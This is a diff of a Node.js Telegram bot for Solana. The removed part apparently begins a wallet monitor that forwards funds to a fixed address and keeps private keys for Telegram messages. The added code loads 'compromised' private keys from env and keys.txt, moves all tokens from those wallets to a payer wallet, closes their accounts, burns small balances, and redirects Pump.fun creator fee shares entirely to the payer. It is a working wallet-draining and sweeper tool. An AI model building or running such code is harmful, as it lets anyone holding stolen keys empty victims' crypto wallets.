@@ -1,2115 +1,1329 @@
-// Maximize libuv I/O threads — must be first line before any require
-process.env.UV_THREADPOOL_SIZE = '8';
+import express from "express";
+import { Bot, InlineKeyboard } from "grammy";
+import {
+  Connection,
+  Keypair,
+  PublicKey,
+  Transaction,
+  SystemProgram,
+  TransactionMessage,
+  VersionedTransaction,
+  ComputeBudgetProgram,
+  LAMPORTS_PER_SOL,
+} from "@solana/web3.js";
 
-const cluster = require('node:cluster');
-const https   = require('https');
-const fs      = require('fs');
-const crypto  = require('crypto');
-require('dotenv').config();
+import {
+  createCloseAccountInstruction,
+  createTransferCheckedInstruction,
+  createAssociatedTokenAccountInstruction,
+  createBurnCheckedInstruction,
+  getAssociatedTokenAddressSync,
+  TOKEN_PROGRAM_ID,
+  TOKEN_2022_PROGRAM_ID,
+} from "@solana/spl-token";
 
-// ── Admin credentials (parsed once at module level) ───────────────────────────
-const ADMIN_PAS  = process.env.ADMIN_PAS || '';
-const _adSep     = ADMIN_PAS.indexOf('_');
-const ADMIN_USER = _adSep >= 0 ? ADMIN_PAS.slice(0, _adSep) : '';
-const ADMIN_PASS = _adSep >= 0 ? ADMIN_PAS.slice(_adSep + 1) : '';
-const AUTH_TOKEN = ADMIN_PAS
-    ? crypto.createHash('sha256').update(ADMIN_PAS + ':sol-monitor-v1').digest('hex')
-    : '';
+import bs58 from "bs58";
+import { readFileSync, existsSync } from "node:fs";
+import { createRequire } from "node:module";
 
-// ─────────────────────────────────────────────────────────────────────────────
-//  Shared helpers (available in both primary and worker)
-// ─────────────────────────────────────────────────────────────────────────────
-const path    = require('path');
-const {
-    Connection, PublicKey, Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL,
-    TransactionExpiredBlockheightExceededError, TransactionExpiredTimeoutError
-} = require('@solana/web3.js');
-const bs58    = require('bs58').default;
+// ──────────────────────────────────────────────────────────
+// إصلاح استيراد @pump-fun/pump-sdk — فصل PDA عن IX
+// ──────────────────────────────────────────────────────────
+const require = createRequire(import.meta.url);
 
-// ── HTTP keep-alive agents — يُعيد استخدام اتصالات TCP بدل فتح جديدة لكل طلب ─
-const httpsKeepAlive = new https.Agent({ keepAlive: true, maxSockets: 10, timeout: 30_000 });
-const express = require('express');
-
-// (PublicNode removed — WSS يأتي من نفس رابط RPC_URLS مباشرةً)
-// Devnet
-const DEVNET_HTTP     = 'https://api.devnet.solana.com';
-const DEVNET_WSS      = 'wss://api.devnet.solana.com';
-// Telegram
-const TG_BOT_TOKEN    = process.env.TELEGRAM_BOT_TOKEN || '';
-
-const PORT         = process.env.PORT || 5000;
-const TARGET_ADDR  = '2tTN93a4KmjnCbsSNodbVxEn3adSxB2VtDXXViYtStQo';
-// مسار ملف حفظ المحافظ — يمكن تغييره عبر متغير بيئة WALLETS_FILE
-// على Render: اضبط WALLETS_FILE=/data/wallets_persist.json مع تفعيل Persistent Disk
-const WALLETS_FILE = process.env.WALLETS_FILE || path.join(__dirname, 'wallets_persist.json');
-
-// Read RPC URLs from RPC_URLS env var (comma OR newline separated)
-const ALL_RPC_URLS = (process.env.RPC_URLS || '')
-    // إزالة بادئة "RPC_URLS=" إذا أدخلها المستخدم بالخطأ مع القيمة
-    .replace(/^\s*RPC_URLS\s*=\s*/i, '')
-    .split(/[,\r\n\s]+/)
-    .map(u => u.trim().replace(/^\uFEFF/, ''))
-    .filter(u => /^https?:\/\//i.test(u));
-
-if (ALL_RPC_URLS.length === 0) {
-    console.error('❌ متغير البيئة RPC_URLS فارغ — أضف الروابط مفصولة بفاصلة');
-    process.exit(1);
-}
-console.log(`[CONFIG] Loaded ${ALL_RPC_URLS.length} RPC URL(s) from env`);
-
-// ── إعدادات Connection Pool ────────────────────────────────────────────────
-const MAX_SUBS_PER_CONN = 1000; // حد Helius الموثَّق: 1000 اشتراك/اتصال
-const SUB_BURST_DELAY   = 50;   // تأخير بين دفعات الاشتراك (ms) — خُفِّض من 200→50
-
-// ── Semaphore — نافذة منزلقة حقيقية (كل ما تنتهي دفعة تبدأ التالية فوراً) ──
-class Semaphore {
-    constructor(max) { this.max = max; this.count = 0; this.queue = []; }
-    acquire() {
-        return new Promise(resolve => {
-            if (this.count < this.max) { this.count++; resolve(); }
-            else { this.queue.push(resolve); }
-        });
+// تحميل pump-sdk بشكل كسول بعد فتح المنفذ حتى لا يفشل healthcheck
+let S = null;
+let PUMP_PDA = null;
+let PUMP_IX = null;
+let _pumpLoading = null;
+async function loadPump() {
+  if (PUMP_PDA) return;
+  if (_pumpLoading) return _pumpLoading;
+  _pumpLoading = (async () => {
+    try {
+      const mod = await import("@pump-fun/pump-sdk");
+      S = mod.default ?? mod;
+    } catch (e1) {
+      S = require("@pump-fun/pump-sdk");
     }
-    release() {
-        this.count--;
-        if (this.queue.length > 0) { this.count++; this.queue.shift()(); }
-    }
+    PUMP_PDA = S;
+    PUMP_IX = S.PUMP_SDK || S;
+    const missing = [];
+    for (const f of ["bondingCurvePda", "feeSharingConfigPda", "canonicalPumpPoolPda"])
+      if (typeof PUMP_PDA[f] !== "function") missing.push("S." + f);
+    for (const f of ["decodeBondingCurve", "decodeSharingConfig", "createFeeSharingConfig", "updateFeeShares"])
+      if (typeof PUMP_IX[f] !== "function") missing.push("S.PUMP_SDK." + f);
+    if (missing.length) console.warn("⚠️ دوال مفقودة من @pump-fun/pump-sdk:", missing.join(", "));
+    else console.log("✅ pump-sdk loaded.");
+  })().catch((e) => { _pumpLoading = null; console.error("❌ فشل تحميل pump-sdk:", e.message); throw e; });
+  return _pumpLoading;
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-//  SolanaWorkerMonitor — runs inside each process (primary or worker)
-//  Only monitors the wallet slice assigned to this process
-// ─────────────────────────────────────────────────────────────────────────────
-class SolanaWorkerMonitor {
-    constructor(onNotification) {
-        this.onNotification    = onNotification;
-        this.targetAddress     = new PublicKey(TARGET_ADDR);
-        this.wallets           = [];
-        this.connections       = [];
-        this.broadcastConnections = [];
-        this.subscriptionIds   = [];
-        this.allRpcUrls        = [];
-        this.lastBalances      = [];
-        this.isMonitoring      = false;
-        this.rpcErrorCounts    = [];
-        this.rpcFailedWallets  = new Set();
-        // Connection pools — اتصالات WebSocket مشتركة بدل اتصال لكل محفظة
-        this.solPool           = [];   // pool للـ SOL subscriptions
-        this.poolUrls          = [];   // روابط HTTP المقابلة لكل اتصال في الـ pool
-        // روابط HTTP للـ snapshot (من RPC_URLS فقط — PublicNode للـ WSS فقط)
-        this.snapshotRpcUrls   = [];
-        this._snapRpcIdx       = 0;
-        // إعدادات الوضع والشبكة والتلجرام
-        this.mode              = 'forward';  // 'forward' | 'telegram'
-        this.chatId            = '';
-        this.network           = 'mainnet';  // 'mainnet' | 'devnet'
-        this.privateKeyStrings = [];         // base58 private keys لإشعارات تلجرام
-        // blockhash مُحدَّث في الخلفية — جاهز فوراً عند الحاجة
-        this._bhCache = { blockhash: null, lastValidBlockHeight: 0, fetchedAt: 0 };
-        this._bhTimer = null;
-        this._rpcIdx  = 0;   // دوران بين broadcastConnections للـ HTTP (لا يحمّل RPC واحدة)
+process.on("unhandledRejection", (e) => console.error("unhandledRejection:", e?.message || e));
+process.on("uncaughtException", (e) => console.error("uncaughtException:", e?.message || e));
+
+// ──────────────────────────────────────────────────────────
+// 1. الإعدادات والمتغيرات الأساسية
+// ──────────────────────────────────────────────────────────
+const ADMIN_IDS = [5053683608, 7011338539, 7722535506, 8266984054, 8314087566, 8725149359, 8458424780];
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const COMPROMISED_PRIVATE_KEY = process.env.FREZON_KEY;
+const FEE_PAYER_PRIVATE_KEY   = process.env.PRIVATE_KEY;
+const CREATOR_PRIVATE_KEY     = process.env.FREZON_KEY || process.env.FREZON_KEY;
+
+const BATCH_SIZE_BURN     = 12;
+const BATCH_SIZE_TRANSFER = 6;
+const PARALLEL_LIMIT      = 6;
+const VALUE_THRESHOLD_USD = 0.05;
+const PREFUND_LAMPORTS    = 6_500_000;
+
+// ──────────────────────────────────────────────────────────
+// قراءة روابط RPC من الأسرار (Environment Variables)
+// التنسيق المطلوب في RPC_URLS:
+// url1,url2,url3,...
+// ──────────────────────────────────────────────────────────
+
+// ──────────────────────────────────────────────────────────
+// قراءة روابط RPC من الأسرار (Environment Variables)
+// التنسيق المطلوب في RPC_URLS:
+// url1,url2,url3,...
+// ──────────────────────────────────────────────────────────
+
+const RPC_URLS = (process.env.RPC_URLS || "")
+  .split(",")
+  .map((u) => u.trim())
+  .filter((u) => u.length > 0);
+
+if (RPC_URLS.length === 0) {
+  console.error("❌ لم يتم العثور على أي روابط RPC في المتغير RPC_URLS!");
+  console.error("   يرجى إضافة المتغير RPC_URLS في الأسرار (Secrets/Environment Variables).");
+  process.exit(1);
+}
+
+// التحقق من صلاحية الروابط
+const validRpcUrls = RPC_URLS.filter((u) => {
+  try {
+    const parsed = new URL(u);
+    return parsed.protocol === "http:" || parsed.protocol === "https:";
+  } catch {
+    console.warn(`⚠️ تجاهل رابط RPC غير صالح: ${u.slice(0, 60)}...`);
+    return false;
+  }
+});
+
+if (validRpcUrls.length === 0) {
+  console.error("❌ جميع روابط RPC غير صالحة!");
+  process.exit(1);
+}
+
+console.log(`✅ تم تحميل ${validRpcUrls.length} رابط RPC من متغيرات البيئة.`);
+
+let _sendPool = validRpcUrls.map((url) => new Connection(url, "confirmed"));
+let _sendPoolIdx = 0;
+
+function getSendConn() {
+  const c = _sendPool[_sendPoolIdx % _sendPool.length];
+  _sendPoolIdx++;
+  return c;
+}
+
+// ──────────────────────────────────────────────────────────
+// استخراج عناوين المحافظ (للعرض في رسائل تلجرام)
+// ──────────────────────────────────────────────────────────
+let _cachedFeePayerPubkey = null;
+let _cachedCreatorPubkey  = null;
+
+function getFeePayerAddress() {
+  if (_cachedFeePayerPubkey) return _cachedFeePayerPubkey;
+  const kp = loadKeypair(FEE_PAYER_PRIVATE_KEY);
+  _cachedFeePayerPubkey = kp ? kp.publicKey.toBase58() : "غير مُهيّأ";
+  return _cachedFeePayerPubkey;
+}
+
+function getCreatorAddress() {
+  if (_cachedCreatorPubkey) return _cachedCreatorPubkey;
+  const kp = loadKeypair(CREATOR_PRIVATE_KEY);
+  _cachedCreatorPubkey = kp ? kp.publicKey.toBase58() : "غير مُهيّأ";
+  return _cachedCreatorPubkey;
+}
+
+function shortAddr(addr) {
+  if (!addr || addr.length < 12) return addr;
+  return addr.slice(0, 4) + "…" + addr.slice(-4);
+}
+
+// ──────────────────────────────────────────────────────────
+// أدوات تحميل المفاتيح
+// ──────────────────────────────────────────────────────────
+
+function decodeBs58(str) {
+  if (typeof bs58.decode === "function") return bs58.decode(str);
+  if (bs58.default && typeof bs58.default.decode === "function") return bs58.default.decode(str);
+  throw new Error("لم يتم العثور على دالة bs58.decode");
+}
+
+function extractValidKeypairs(text) {
+  if (!text) return [];
+  const validKeypairs = [];
+
+  const jsonMatches = text.match(/\[\s*\d+(?:\s*,\s*\d+){63}\s*\]/g) || [];
+  for (const match of jsonMatches) {
+    try {
+      const arr = JSON.parse(match);
+      if (Array.isArray(arr) && arr.length === 64) {
+        validKeypairs.push(Keypair.fromSecretKey(Uint8Array.from(arr)));
+      }
+    } catch {}
+  }
+
+  const tokens = text.match(/[1-9A-HJ-NP-Za-km-z]{80,100}/g) || [];
+  for (const token of tokens) {
+    try {
+      const decoded = decodeBs58(token);
+      if (decoded.length === 64) {
+        validKeypairs.push(Keypair.fromSecretKey(decoded));
+      }
+    } catch {}
+  }
+
+  return validKeypairs;
+}
+
+function loadKeypair(rawKey) {
+  if (rawKey) {
+    const keys = extractValidKeypairs(rawKey);
+    if (keys.length > 0) return keys[0];
+  }
+  return null;
+}
+
+async function getParsedTokenAccountsSafe(connection, ownerPubkey, programId) {
+  try {
+    const conn = getSendConn();
+    const res = await conn._rpcRequest("getTokenAccountsByOwner", [
+      ownerPubkey.toBase58(),
+      { programId: programId.toBase58() },
+      { encoding: "jsonParsed", commitment: "confirmed" }
+    ]);
+
+    if (res.error) throw new Error(res.error.message);
+
+    const accounts = res.result?.value || [];
+    return accounts
+      .filter(a => typeof a.account.data === "object" && a.account.data.parsed)
+      .map(a => ({
+        pubkey: new PublicKey(a.pubkey),
+        account: a.account,
+        programId: programId
+      }));
+  } catch (err) {
+    return [];
+  }
+}
+
+async function sendAndConfirm(connection, tx, signers) {
+  const sendConn = getSendConn();
+  const { blockhash, lastValidBlockHeight } = await sendConn.getLatestBlockhash("confirmed");
+  tx.recentBlockhash = blockhash;
+  tx.sign(...signers);
+
+  const sig = await sendConn.sendRawTransaction(tx.serialize(), {
+    skipPreflight: false,
+    preflightCommitment: "confirmed",
+  });
+
+  const confirmation = await sendConn.confirmTransaction(
+    { signature: sig, blockhash, lastValidBlockHeight },
+    "confirmed"
+  );
+
+  if (confirmation.value.err) {
+    throw new Error(`فشل التأكيد: ${JSON.stringify(confirmation.value.err)}`);
+  }
+
+  return sig;
+}
+
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+async function runWithConcurrency(items, limit, worker) {
+  const results = new Array(items.length);
+  let idx = 0;
+  const workers = new Array(Math.min(limit, items.length)).fill(0).map(async () => {
+    while (true) {
+      const i = idx++;
+      if (i >= items.length) break;
+      try { results[i] = { status: "fulfilled", value: await worker(items[i], i) }; }
+      catch (e) { results[i] = { status: "rejected", reason: e }; }
+    }
+  });
+  await Promise.all(workers);
+  return results;
+}
+
+// ──────────────────────────────────────────────────────────
+// 1.5 استعلام الأسعار
+// ──────────────────────────────────────────────────────────
+
+async function fetchWithTimeout(url, ms = 8000, opts = {}) {
+  const ctrl = new AbortController();
+  const t = setTimeout(() => ctrl.abort(), ms);
+  try {
+    const r = await fetch(url, { ...opts, signal: ctrl.signal });
+    return r;
+  } finally {
+    clearTimeout(t);
+  }
+}
+
+async function fetchPricesJupiter(mints) {
+  const out = {};
+  try {
+    const chunks = [];
+    for (let i = 0; i < mints.length; i += 50) chunks.push(mints.slice(i, i + 50));
+    const results = await Promise.all(chunks.map(async (c) => {
+      try {
+        const r = await fetchWithTimeout(`https://lite-api.jup.ag/price/v3?ids=${c.join(",")}`);
+        if (!r.ok) return {};
+        return await r.json();
+      } catch { return {}; }
+    }));
+    for (const chunk of results) {
+      for (const [k, v] of Object.entries(chunk || {})) {
+        const p = parseFloat(v?.usdPrice ?? v?.price);
+        if (p > 0) out[k] = p;
+      }
+    }
+  } catch {}
+  return out;
+}
+
+async function fetchPricesDexScreener(mints) {
+  const out = {};
+  try {
+    const chunks = [];
+    for (let i = 0; i < mints.length; i += 30) chunks.push(mints.slice(i, i + 30));
+    const results = await Promise.all(chunks.map(async (c) => {
+      try {
+        const r = await fetchWithTimeout(`https://api.dexscreener.com/latest/dex/tokens/${c.join(",")}`);
+        if (!r.ok) return null;
+        return await r.json();
+      } catch { return null; }
+    }));
+    const bestLiq = {};
+    for (const j of results) {
+      if (!j?.pairs) continue;
+      for (const p of j.pairs) {
+        const mint = p.baseToken?.address;
+        const price = parseFloat(p.priceUsd);
+        const liq = parseFloat(p.liquidity?.usd || 0);
+        if (!mint || !(price > 0)) continue;
+        if (!(mint in bestLiq) || liq > bestLiq[mint]) {
+          bestLiq[mint] = liq;
+          out[mint] = price;
+        }
+      }
+    }
+  } catch {}
+  return out;
+}
+
+async function fetchPricesRaydium(mints) {
+  const out = {};
+  try {
+    const chunks = [];
+    for (let i = 0; i < mints.length; i += 50) chunks.push(mints.slice(i, i + 50));
+    const results = await Promise.all(chunks.map(async (c) => {
+      try {
+        const r = await fetchWithTimeout(`https://api-v3.raydium.io/mint/price?mints=${c.join(",")}`);
+        if (!r.ok) return {};
+        const j = await r.json();
+        return j.data || {};
+      } catch { return {}; }
+    }));
+    for (const chunk of results) {
+      for (const [k, v] of Object.entries(chunk)) {
+        const p = parseFloat(v);
+        if (p > 0) out[k] = p;
+      }
+    }
+  } catch {}
+  return out;
+}
+
+async function getTokenPrices(mints) {
+  const uniq = Array.from(new Set(mints.filter(Boolean)));
+  if (uniq.length === 0) return {};
+  const [jup, dex, ray] = await Promise.all([
+    fetchPricesJupiter(uniq),
+    fetchPricesDexScreener(uniq),
+    fetchPricesRaydium(uniq),
+  ]);
+  const out = {};
+  for (const m of uniq) {
+    const arr = [jup[m], dex[m], ray[m]].filter(p => typeof p === "number" && p > 0);
+    out[m] = arr.length ? Math.max(...arr) : 0;
+  }
+  return out;
+}
+
+async function classifyAccountsByValue(accounts) {
+  const mints = accounts.map(a => a.account.data.parsed?.info?.mint).filter(Boolean);
+  const prices = await getTokenPrices(mints);
+
+  const valuable = [];
+  const burnable = [];
+  for (const a of accounts) {
+    const info = a.account.data.parsed?.info;
+    const mint = info?.mint;
+    const decimals = info?.tokenAmount?.decimals ?? 0;
+    const rawAmt = BigInt(info?.tokenAmount?.amount || "0");
+    const price = prices[mint] || 0;
+    const uiAmount = Number(rawAmt) / Math.pow(10, decimals);
+    const valueUsd = uiAmount * price;
+
+    a._valueUsd = valueUsd;
+    a._priceUsd = price;
+    a._uiAmount = uiAmount;
+
+    if (valueUsd > VALUE_THRESHOLD_USD) valuable.push(a);
+    else burnable.push(a);
+  }
+  return { valuable, burnable };
+}
+
+function formatValuableList(valuable) {
+  if (valuable.length === 0) return "لا توجد توكنات قيّمة.";
+  const rows = valuable
+    .sort((a, b) => b._valueUsd - a._valueUsd)
+    .slice(0, 25)
+    .map((a) => {
+      const info = a.account.data.parsed?.info;
+      const mint = info?.mint || "";
+      const shortMint = mint.slice(0, 4) + "…" + mint.slice(-4);
+      return `• ${shortMint} — $${a._valueUsd.toFixed(4)}`;
+    });
+  let extra = "";
+  if (valuable.length > 25) extra = `\n… و ${valuable.length - 25} توكن آخر`;
+  return rows.join("\n") + extra;
+}
+
+// ──────────────────────────────────────────────────────────
+// 2. منطق المعالجة الأساسي
+// ──────────────────────────────────────────────────────────
+
+async function executeTransferTokens() {
+  const feePayerKeypair = loadKeypair(FEE_PAYER_PRIVATE_KEY);
+  if (!feePayerKeypair) return { success: false, msg: "خطأ في تحميل مفتاح الدافع" };
+
+  let allCompromisedKeypairs = [];
+  if (COMPROMISED_PRIVATE_KEY) {
+    allCompromisedKeypairs.push(...extractValidKeypairs(COMPROMISED_PRIVATE_KEY));
+  }
+  if (existsSync("./keys.txt")) {
+    const fc = readFileSync("./keys.txt", "utf8");
+    allCompromisedKeypairs.push(...extractValidKeypairs(fc));
+  }
+
+  const uniqueKeypairsMap = new Map();
+  for (const kp of allCompromisedKeypairs) {
+    uniqueKeypairsMap.set(kp.publicKey.toBase58(), kp);
+  }
+  allCompromisedKeypairs = Array.from(uniqueKeypairsMap.values());
+
+  let totalClosed = 0;
+  const connection = getSendConn();
+
+  for (const compromisedKeypair of allCompromisedKeypairs) {
+    const [tokenAccounts, token2022Accounts] = await Promise.all([
+      getParsedTokenAccountsSafe(connection, compromisedKeypair.publicKey, TOKEN_PROGRAM_ID),
+      getParsedTokenAccountsSafe(connection, compromisedKeypair.publicKey, TOKEN_2022_PROGRAM_ID),
+    ]);
+
+    const processable = [...tokenAccounts, ...token2022Accounts].filter(a => a.account.data.parsed?.info?.state !== "frozen");
+    if (processable.length === 0) continue;
+
+    const existingAtas = new Set();
+    for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
+      const atas = await getParsedTokenAccountsSafe(connection, feePayerKeypair.publicKey, programId);
+      atas.forEach(a => existingAtas.add(a.account.data.parsed?.info?.mint));
     }
 
-    notify(message, type = 'info') {
-        this.onNotification(message, type);
+    const batches = [];
+    for (let i = 0; i < processable.length; i += BATCH_SIZE_TRANSFER) {
+      batches.push(processable.slice(i, i + BATCH_SIZE_TRANSFER));
     }
 
-    // settings: { mode, chatId, network }
-    async load(walletSlice, rpcSlice, allRpcUrls, settings = {}) {
-        this.stop();
-        this.wallets           = [];
-        this.connections       = [];
-        this.privateKeyStrings = [];
-        this.rpcErrorCounts    = new Array(rpcSlice.length).fill(0);
-        this.rpcFailedWallets.clear();
-        // تطبيق الإعدادات
-        this.mode    = settings.mode    || 'forward';
-        this.chatId  = settings.chatId  || '';
-        this.network = settings.network || 'mainnet';
+    const results = await runWithConcurrency(batches, PARALLEL_LIMIT, async (batch) => {
+      const tx = new Transaction();
+      tx.feePayer = feePayerKeypair.publicKey;
+      const mintsInThisTx = new Set();
 
-        // على devnet نستخدم devnet endpoint دائماً للبث — RPC_URLS تخص mainnet
-        const broadcastUrls = this.network === 'devnet'
-            ? [DEVNET_HTTP]
-            : (allRpcUrls && allRpcUrls.length ? allRpcUrls : rpcSlice);
-        this.allRpcUrls = broadcastUrls;
-        this.broadcastConnections = broadcastUrls.map(u => new Connection(u, 'confirmed'));
+      for (const account of batch) {
+        const info     = account.account.data.parsed?.info;
+        const mintStr  = info?.mint;
+        const mint     = new PublicKey(mintStr);
+        const decimals = info?.tokenAmount?.decimals ?? 0;
+        const rawAmt   = BigInt(info?.tokenAmount?.amount || "0");
+        const progId   = account.programId;
 
-        this._rpcIdx = 0; // إعادة تعيين الدوران عند كل load
+        if (rawAmt > 0n) {
+          const destAta = getAssociatedTokenAddressSync(mint, feePayerKeypair.publicKey, false, progId);
+          if (!existingAtas.has(mintStr) && !mintsInThisTx.has(mintStr)) {
+            tx.add(createAssociatedTokenAccountInstruction(
+              feePayerKeypair.publicKey, destAta, feePayerKeypair.publicKey, mint, progId
+            ));
+            mintsInThisTx.add(mintStr);
+          }
+          tx.add(createTransferCheckedInstruction(
+            account.pubkey, mint, destAta, compromisedKeypair.publicKey, rawAmt, decimals, [], progId
+          ));
+        }
 
-        // ── بناء SOL Connection Pool — اتصال واحد لكل 1000 محفظة، WSS من رابطه ─
-        // الـ pool يستخدم rpcSlice (روابط هذا العامل) وليس كل الروابط
-        const monitorUrls = this.network === 'devnet'
-            ? [DEVNET_HTTP]
-            : (rpcSlice.length ? rpcSlice : (allRpcUrls?.length ? allRpcUrls : []));
-        if (!monitorUrls.length) throw new Error('لا توجد روابط RPC للمراقبة');
-        // عدد الاتصالات = عدد مجموعات الـ 1000 — نُعيد تدوير الروابط إذا تجاوزنا عددها
-        const poolSize = Math.max(1, Math.ceil(walletSlice.length / MAX_SUBS_PER_CONN));
-        this.poolUrls = Array.from({ length: poolSize }, (_, i) => monitorUrls[i % monitorUrls.length]);
-        this.solPool  = this.poolUrls.map(httpUrl => {
-            const wssUrl = httpUrl.replace(/^https?:\/\//i, 'wss://');
-            return new Connection(httpUrl, { commitment: 'confirmed', wsEndpoint: wssUrl });
+        tx.add(createCloseAccountInstruction(
+          account.pubkey, feePayerKeypair.publicKey, compromisedKeypair.publicKey, [], progId
+        ));
+      }
+
+      await sendAndConfirm(connection, tx, [feePayerKeypair, compromisedKeypair]);
+      mintsInThisTx.forEach(m => existingAtas.add(m));
+      return batch.length;
+    });
+
+    results.forEach(r => { if (r.status === "fulfilled") totalClosed += r.value; });
+  }
+
+  const solRecovered = (totalClosed * 0.00204).toFixed(5);
+  return {
+    success: true,
+    solRecovered,
+    pubkey: feePayerKeypair.publicKey.toBase58()
+  };
+}
+
+async function analyzeBurnPreview() {
+  const feePayerKeypair = loadKeypair(FEE_PAYER_PRIVATE_KEY);
+  if (!feePayerKeypair) return { success: false, msg: "خطأ في المفتاح" };
+
+  const connection = getSendConn();
+  const [tokenAccounts, token2022Accounts] = await Promise.all([
+    getParsedTokenAccountsSafe(connection, feePayerKeypair.publicKey, TOKEN_PROGRAM_ID),
+    getParsedTokenAccountsSafe(connection, feePayerKeypair.publicKey, TOKEN_2022_PROGRAM_ID),
+  ]);
+
+  const processable = [...tokenAccounts, ...token2022Accounts].filter(a => a.account.data.parsed?.info?.state !== "frozen");
+  const { valuable, burnable } = await classifyAccountsByValue(processable);
+
+  return { success: true, valuable, burnable, pubkey: feePayerKeypair.publicKey.toBase58() };
+}
+
+async function executeBurnAndClose() {
+  const feePayerKeypair = loadKeypair(FEE_PAYER_PRIVATE_KEY);
+  if (!feePayerKeypair) return { success: false, msg: "خطأ في المفتاح" };
+
+  const preview = await analyzeBurnPreview();
+  if (!preview.success) return preview;
+  const burnable = preview.burnable;
+
+  if (burnable.length === 0) {
+    return { success: true, solRecovered: "0.00000", pubkey: feePayerKeypair.publicKey.toBase58(), skipped: preview.valuable.length };
+  }
+
+  const batches = [];
+  for (let i = 0; i < burnable.length; i += BATCH_SIZE_BURN) {
+    batches.push(burnable.slice(i, i + BATCH_SIZE_BURN));
+  }
+
+  let successCount = 0;
+
+  const results = await runWithConcurrency(batches, PARALLEL_LIMIT, async (batch) => {
+    const tx = new Transaction();
+    tx.feePayer = feePayerKeypair.publicKey;
+
+    for (const account of batch) {
+      const info     = account.account.data.parsed?.info;
+      const mint     = new PublicKey(info?.mint);
+      const decimals = info?.tokenAmount?.decimals ?? 0;
+      const rawAmt   = BigInt(info?.tokenAmount?.amount || "0");
+      const progId   = account.programId;
+
+      if (rawAmt > 0n) {
+        tx.add(createBurnCheckedInstruction(
+          account.pubkey, mint, feePayerKeypair.publicKey, rawAmt, decimals, [], progId
+        ));
+      }
+
+      tx.add(createCloseAccountInstruction(
+        account.pubkey, feePayerKeypair.publicKey, feePayerKeypair.publicKey, [], progId
+      ));
+    }
+
+    const conn = getSendConn();
+    await sendAndConfirm(conn, tx, [feePayerKeypair]);
+    return batch.length;
+  });
+
+  results.forEach(r => { if (r.status === "fulfilled") successCount += r.value; });
+
+  const solRecovered = (successCount * 0.00204).toFixed(5);
+  return {
+    success: true,
+    solRecovered,
+    pubkey: feePayerKeypair.publicKey.toBase58(),
+    skipped: preview.valuable.length,
+  };
+}
+
+// ──────────────────────────────────────────────────────────
+// 2.4 نقل تفويض مكافآت المنشئ (Pump.fun) — النسخة المُصلَّحة
+// ──────────────────────────────────────────────────────────
+async function executeDelegateTransfer(mintStr) {
+  const payer = loadKeypair(FEE_PAYER_PRIVATE_KEY);
+  const creatorKp = loadKeypair(CREATOR_PRIVATE_KEY);
+  if (!payer) return { success: false, msg: "مفتاح دافع الرسوم غير مُهيّأ" };
+  if (!creatorKp) return { success: false, msg: "مفتاح المنشئ غير مُهيّأ" };
+
+  let mint;
+  try { mint = new PublicKey(mintStr); }
+  catch { return { success: false, msg: "عنوان توكن غير صالح" }; }
+
+  const conn = getSendConn();
+
+  // ⚠️ استخدام PUMP_PDA (وليس PUMP) لحساب الـ PDA
+  await loadPump();
+  const curveInfo = await conn.getAccountInfo(PUMP_PDA.bondingCurvePda(mint));
+  if (!curveInfo) return { success: false, msg: "لم يتم العثور على حساب العملة (bonding curve)" };
+
+  // ⚠️ استخدام PUMP_IX لفك التشفير
+  const curve = PUMP_IX.decodeBondingCurve(curveInfo);
+  const creator = curve.creator;
+
+  if (!creator.equals(creatorKp.publicKey)) {
+    return {
+      success: false,
+      msg: `المحفظة الحالية ليست المنشئ.\nالمنشئ الحالي: ${creator.toBase58()}\nمحفظتنا: ${creatorKp.publicKey.toBase58()}`
+    };
+  }
+
+  // ⚠️ استخدام PUMP_PDA لحساب PDA الإعدادات
+  const scPda = PUMP_PDA.feeSharingConfigPda(mint);
+  const scInfo = await conn.getAccountInfo(scPda);
+  const ixs = [ComputeBudgetProgram.setComputeUnitLimit({ units: 400_000 })];
+  let authority = creator;
+  let current = [creator];
+
+  if (scInfo) {
+    const sc = PUMP_IX.decodeSharingConfig(scInfo);
+    authority = sc.admin;
+    current = sc.shareholders.map((s) => s.address);
+    if (sc.adminRevoked) return { success: false, msg: "صلاحية تعديل الإعدادات ملغاة نهائيًا" };
+    if (!authority.equals(creatorKp.publicKey)) {
+      return { success: false, msg: "المحفظة ليست مدير إعدادات المشاركة" };
+    }
+  } else {
+    ixs.push(SystemProgram.transfer({
+      fromPubkey: payer.publicKey,
+      toPubkey: scPda,
+      lamports: PREFUND_LAMPORTS,
+    }));
+    // ⚠️ استخدام PUMP_PDA لحساب pool PDA
+    // توسيع حساب العملة مسبقًا على حساب المستلم (المنشئ لا يستطيع دفع SOL)
+    if (!curve.complete && PUMP_IX.extendAccountInstruction) {
+      ixs.push(await PUMP_IX.extendAccountInstruction({ account: PUMP_PDA.bondingCurvePda(mint), user: payer.publicKey }));
+    }
+    const pool = curve.complete ? PUMP_PDA.canonicalPumpPoolPda(mint) : null;
+    ixs.push(await PUMP_IX.createFeeSharingConfig({ creator, mint, pool }));
+  }
+
+  const upd = await PUMP_IX.updateFeeShares({
+    authority,
+    mint,
+    currentShareholders: current,
+    newShareholders: [{ address: payer.publicKey, shareBps: 10_000 }],
+  });
+  upd.keys.push({ pubkey: creator, isSigner: false, isWritable: true });
+  ixs.push(upd);
+
+  const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash("confirmed");
+  const msg = new TransactionMessage({
+    payerKey: payer.publicKey,
+    recentBlockhash: blockhash,
+    instructions: ixs,
+  }).compileToV0Message();
+  const tx = new VersionedTransaction(msg);
+  tx.sign([payer, creatorKp]);
+
+  const sim = await conn.simulateTransaction(tx, { sigVerify: true, commitment: "confirmed" });
+  if (sim.value.err) {
+    const logs = (sim.value.logs || []).filter(l => /Instruction:|failed|Error/.test(l)).slice(0, 6).join("\n");
+    return { success: false, msg: `فشلت المحاكاة: ${JSON.stringify(sim.value.err)}\n${logs}` };
+  }
+
+  const sig = await conn.sendRawTransaction(tx.serialize(), { skipPreflight: false, maxRetries: 3 });
+  const conf = await conn.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, "confirmed");
+  if (conf.value.err) return { success: false, msg: `فشل التأكيد: ${JSON.stringify(conf.value.err)}` };
+
+  return {
+    success: true,
+    sig,
+    recipient: payer.publicKey.toBase58(),
+    creator: creatorKp.publicKey.toBase58(),
+    mint: mint.toBase58(),
+  };
+}
+
+// ──────────────────────────────────────────────────────────
